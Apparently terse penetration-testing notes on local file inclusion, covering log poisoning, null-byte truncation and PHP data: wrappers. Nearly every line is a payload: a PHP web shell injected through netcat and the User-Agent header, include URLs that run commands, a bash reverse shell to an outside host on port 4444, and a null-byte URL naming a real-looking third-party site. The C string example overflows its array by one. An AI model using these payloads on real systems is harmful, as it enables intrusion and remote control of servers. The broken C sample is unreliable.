### Contaminating Log Files to LFI
```
1.
nc -nv 10.11.0.22 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig

2. User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
http://10.11.0.22/menu.php?file=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

### Null byte to mark the end of file
```
To write a string in PHP, we simply write
$string = ‘hello’;
Unfortunately, C does not have a string data type. To write a string in C/C++ we must use an array.
Char string[5];
string[0]=’h’;
string[1]=’e’;
string[2]=’l’;
string[3]=’l’;
string[4]=’o’;
string[5]=’\0′;
http://www.bostonwebgroup.com/script.php?file=shell.php%00.dat
```

### PHP wrappers
```
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>(it will execute dir right away)
$fp = fopen('data:text/plain;base64,'.base64_encode($data), 'rb'); // base64 encoded data
```
